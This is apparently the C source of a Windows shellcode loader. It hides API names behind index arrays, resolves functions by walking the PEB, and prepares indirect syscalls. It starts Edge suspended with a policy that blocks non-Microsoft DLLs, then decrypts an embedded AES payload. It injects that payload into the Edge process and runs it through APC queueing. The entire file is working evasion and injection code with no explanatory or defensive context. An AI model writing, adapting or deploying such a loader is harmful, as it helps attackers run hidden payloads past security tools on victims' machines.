
#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include <tlhelp32.h>

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;


DWORD wNtAllocateVirtualMemory;
UINT_PTR sysAddrNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
DWORD wNtResumeThread;
UINT_PTR sysAddrNtResumeThread;
DWORD wNtOpenProcess;
UINT_PTR sysAddrNtOpenProcess;
DWORD wNtProtectVirtualMemory;
UINT_PTR sysAddrNtProtectVirtualMemory;
DWORD wNtQueueApcThread;
UINT_PTR sysAddrNtQueueApcThread;


char* getoriginal(int offsets[], char* big_string, int sizeof_offset) {
    // Calculate the number of elements in the offsets array
    int num_offsets = sizeof_offset / sizeof(int);

    
    char* result = (char*)malloc(num_offsets + 1); 
    

    // Build the resulting string
    for (int i = 0; i < num_offsets; ++i) {
        result[i] = big_string[offsets[i]];
    }

    // Null-terminate the string
    result[num_offsets] = '\0';

    return result;
}

void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)coolcode, &coolcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

typedef void* (*cool)(void*, size_t);

typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB ProcessEnvironmentBlock;
} TEB, *PTEB;

cool Getaddress(const char *vv, const char *moduleName) {

    PTEB teb;
#ifdef _M_X64
    teb = (PTEB)__readgsqword(0x30);
#else
    teb = (PTEB)__readfsdword(0x18);
#endif

    PPEB peb = teb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* entry = moduleList->Flink;

    // Convert moduleName to wide string (since BaseDllName is wide string)
    wchar_t wModuleName[MAX_PATH];
    mbstowcs(wModuleName, moduleName, MAX_PATH);

    while (entry != moduleList) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
        entry = entry->Flink;

        if (!module->BaseDllName.Buffer) continue;
        
       
        
        if (_wcsicmp(module->BaseDllName.Buffer, wModuleName) == 0) {  // Compare with variable
            BYTE* baseAddress = (BYTE*)module->DllBase;
            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            
            if (exportDir.VirtualAddress == 0) return NULL;
            
            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
            
            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
                char* functionName = (char*)(baseAddress + nameArray[i]);
                
                
                if (strcmp(functionName, vv) == 0) {
                    DWORD funcRVA = funcArray[ordinalArray[i]];
                    void* funadd = (void*)(baseAddress + funcRVA);
                    //printf("%s found at address: %p\n", vv, funadd);
                    return (cool)funadd;
                }
            }
        }
    }
    return NULL;
}



int main(int argc, char* argv[]) {
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";


    unsigned char AESkey[] = { 0x8c, 0x22, 0xda, 0x54, 0xa6, 0xd5, 0x11, 0x2b, 0xf8, 0x0c, 0x1a, 0xbd, 0x51, 0xae, 0xce, 0xd1 };
    unsigned char cool[] = { 0xc7, 0xd4, 0x82, 0x51, 0xa0, 0x51, 0x1e, 0x7a, 0x57, 0x5b, 0x34, 0xd8, 0x38, 0x68, 0x6d, 0xbb, 0x2c, 0x2c, 0x1e, 0x51, 0xfd, 0x94, 0x88, 0xae, 0x2d, 0xe4, 0xce, 0xc1, 0xd1, 0x2f, 0x28, 0xf8, 0xa4, 0xf0, 0xd4, 0xb7, 0xe1, 0xc9, 0x80, 0x96, 0x86, 0x35, 0x1f, 0xea, 0x80, 0xbc, 0x45, 0xd5, 0xe3, 0x61, 0xd1, 0xa0, 0xd4, 0xf0, 0x8a, 0x5d, 0xcf, 0xc3, 0xa1, 0x83, 0x47, 0x79, 0x32, 0x76, 0x2d, 0x32, 0x5e, 0x07, 0x27, 0x20, 0xad, 0xd0, 0x10, 0x98, 0x76, 0x50, 0x16, 0x01, 0x24, 0xac, 0x32, 0x82, 0x11, 0xa0, 0x15, 0x6c, 0xc7, 0x0a, 0xa7, 0x55, 0xe0, 0xf7, 0xfa, 0x01, 0x27, 0xf0, 0x58, 0x8d, 0xf5, 0x7f, 0xf7, 0xc4, 0x94, 0x6f, 0xe6, 0x60, 0x19, 0x0e, 0xad, 0xcb, 0x77, 0x85, 0xea, 0xd4, 0xda, 0x5e, 0x75, 0x0d, 0x23, 0xd4, 0x48, 0x72, 0xd4, 0xed, 0x59, 0xcb, 0x8e, 0x9b, 0x26, 0xa2, 0x42, 0x10, 0x61, 0xca, 0x59, 0x12, 0x70, 0x53, 0xa3, 0xe4, 0xf4, 0xbf, 0x44, 0x08, 0x89, 0xec, 0xcb, 0x92, 0x8c, 0x50, 0x19, 0x97, 0xc6, 0x31, 0xe4, 0xf5, 0x8c, 0x30, 0x77, 0xde, 0x05, 0x03, 0xcb, 0xff, 0x18, 0x8c, 0x8f, 0xcb, 0x8a, 0xe5, 0x88, 0x81, 0xed, 0xf3, 0x09, 0xba, 0x50, 0x7f, 0x87, 0xba, 0xd4, 0xc6, 0x20, 0xd3, 0x0f, 0x0b, 0xd3, 0x7e, 0x01, 0x3b, 0x56, 0x06, 0x45, 0x99, 0x99, 0x48, 0xcd, 0x78, 0x9a, 0x3a, 0xc8, 0x18, 0x58, 0xff, 0xa1, 0x4d, 0xd6, 0xf5, 0x56, 0xd0, 0x11, 0x61, 0x84, 0x66, 0x26, 0xe3, 0x77, 0xf6, 0xed, 0xbb, 0x0b, 0xc1, 0xa8, 0x24, 0xdf, 0x85, 0xe1, 0x22, 0xa7, 0x25, 0x67, 0x43, 0xbd, 0x3b, 0x4f, 0x54, 0x7a, 0xdc, 0xba, 0xd9, 0xe1, 0x8d, 0xd4, 0xa1, 0xec, 0xef, 0xe3, 0xd0, 0xbe, 0xde, 0x08, 0xce, 0xea, 0xf1, 0x99, 0xf8, 0x67, 0xb9, 0xef, 0x7f, 0x83, 0x0e, 0x4d, 0x2b, 0x2c, 0xa5, 0x58, 0xb4, 0xe7, 0xaf, 0xdb, 0xc1, 0x75, 0xc1, 0x3a, 0x1f, 0x8a, 0x25, 0x21, 0x28, 0xb7, 0xc7, 0xad, 0xe6, 0xfc, 0xb6, 0x44, 0x24, 0xfb, 0x61, 0x11, 0xc5, 0x7f, 0x9b, 0x68, 0xe2, 0xba, 0x43, 0xee, 0xf9, 0xb8, 0x3b, 0xf6, 0xf3, 0x23, 0x05, 0xcc, 0x6f, 0xbc, 0xbc, 0x36, 0x6d, 0x40, 0x46, 0xbc, 0x05, 0xca, 0x63, 0x2e, 0x53, 0x59, 0x7f, 0x93, 0xff, 0x0f, 0x08, 0x10, 0xc6, 0x40, 0x61, 0xfd, 0x22, 0xfd, 0xc7, 0x14, 0x92, 0x67, 0xbd, 0xf6, 0xc6, 0xf2, 0xae, 0xe3, 0x85, 0x8c, 0x96, 0xe9, 0x49, 0xcc, 0x03, 0x06, 0x94, 0xf0, 0xf5, 0x84, 0x02, 0x14, 0xff, 0xb5, 0xdd, 0xb0, 0xdf, 0x07, 0xb3, 0x06, 0xec, 0xc9, 0x6a, 0xaf, 0x8a, 0xe0, 0x33, 0xce, 0xa2, 0xdf, 0x07, 0xcd, 0x21, 0xdd, 0x41, 0x38, 0x49, 0x40, 0xeb, 0x66, 0xe8, 0x8d, 0xb8, 0x27, 0xd6, 0x5d, 0xb1, 0x3a, 0x6d, 0x6f, 0x2e, 0x45, 0xd2, 0xad, 0xa1, 0x18, 0xcb, 0xb4, 0x79, 0x14, 0x4e, 0x91, 0x66, 0x01, 0xa0, 0xd2, 0xbf, 0x0d, 0xfe, 0xac, 0x3a, 0x99, 0xa1, 0x0c, 0xd7, 0x62, 0x8b, 0xc6, 0x97, 0xa2, 0x58, 0x58, 0x77, 0x3e, 0xa2, 0x69, 0x35, 0xb2, 0xd4, 0x7c, 0xa3, 0x6a, 0xaa, 0x83, 0xd0, 0xb6, 0x14, 0xfe, 0x29, 0x15, 0xbd, 0x65, 0x5f, 0xf1, 0x72, 0x32, 0x11, 0xe7, 0x13, 0x29, 0x8c, 0x57, 0x31, 0x6d, 0x2e, 0x37, 0xb1, 0x18, 0x8b };
    SIZE_T coolSize = sizeof(cool);
    //Get a handle to the ntdll.dll library
    //hello
    int ntt[] = {39, 45, 29, 37, 37, 62, 29, 37, 37};
    const char* ntd = getoriginal(ntt, big_string, sizeof(ntt));
    
    
    int ws_lld_ker_32[] = {36, 30, 43, 39, 30, 37, 55, 54, 62, 29, 37, 37};
    const char* ker32 = getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32));
    
    
    int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    

    int ntwrite_mem[] = { 39, 19, 48, 17, 8, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    const char* nt_write_V_mem=getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem));
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)Getaddress(nt_write_V_mem, ntd);
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

    int ntcre_thre[] = { 39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23 };
    

    
    const char* resthred="NtResumeThread";
    UINT_PTR pNtResumeThread = (UINT_PTR)Getaddress(resthred, ntd);
    wNtResumeThread = ((unsigned char*)(pNtResumeThread + 4))[0];
    sysAddrNtResumeThread = pNtResumeThread + 0x12;


    int prtevirmem[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
    const char* ntprovirtMem=getoriginal(prtevirmem, big_string, sizeof(prtevirmem));
    UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)Getaddress(ntprovirtMem, ntd);
    wNtProtectVirtualMemory = ((unsigned char*)(pNtProtectVirtualMemory + 4))[0];
    sysAddrNtProtectVirtualMemory = pNtProtectVirtualMemory + 0x12;
    
    int apcqu[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
    const char* ntqueuusrapc=getoriginal(apcqu, big_string, sizeof(apcqu));
    UINT_PTR pNtQueueApcThread = (UINT_PTR)Getaddress(ntqueuusrapc, ntd);
    wNtQueueApcThread = ((unsigned char*)(pNtQueueApcThread + 4))[0];
    sysAddrNtQueueApcThread = pNtQueueApcThread + 0x12;


    

    STARTUPINFOEX si = { 0 };  
    PROCESS_INFORMATION pi = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEX); 

    SIZE_T attributeSize = 0;

    
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);


    DWORD policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    
    si.lpAttributeList = attributes;

    //char* notpa[] = {28, 64, 63, 48, 8, 13, 3, 14, 22, 18, 63, 44, 24, 18, 19, 4, 12, 55, 54, 63, 13, 14, 19, 4, 15, 0, 3, 62, 4, 23, 4};
    
    //CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR) "/c start cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
    int edg[] = {12, 18, 4, 3, 6, 4, 62, 4, 23, 4};
    char edgePath[512];  // Allocate enough space for the full path

// Corrected string construction
    snprintf(edgePath, sizeof(edgePath), "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\%s", getoriginal(edg, big_string, sizeof(edg)));
    CreateProcessA((LPSTR)edgePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
    
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    
    int virnuma[]={47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23, 39, 20, 12, 0};
    const char* virtalloexnum=getoriginal(virnuma, big_string, sizeof(virnuma));
    LPVOID (*pvirnuma)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD) = 
    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD)) 
    Getaddress(virtalloexnum,ker32);
    
    PVOID remoteMemory = pvirnuma(hProcess, NULL, coolSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);


    aedecok((char*)cool, sizeof(cool), AESkey, sizeof(AESkey));

    
    SIZE_T bytesWritten;
    


    NTSTATUS status = NtWriteVirtualMemory(hProcess, remoteMemory, cool, coolSize, (PULONG)&bytesWritten);
    

    
    
    DWORD oldProtect;
    


    status = NtProtectVirtualMemory(hProcess, &remoteMemory, &coolSize, PAGE_EXECUTE_READ, &oldProtect);


    
    


    
    status = NtQueueApcThread(hThread, (PVOID)remoteMemory, NULL, NULL, NULL);

    
    
    ULONG previousSuspendCount;
    status = NtResumeThread(hThread, &previousSuspendCount);

    return 0;
}
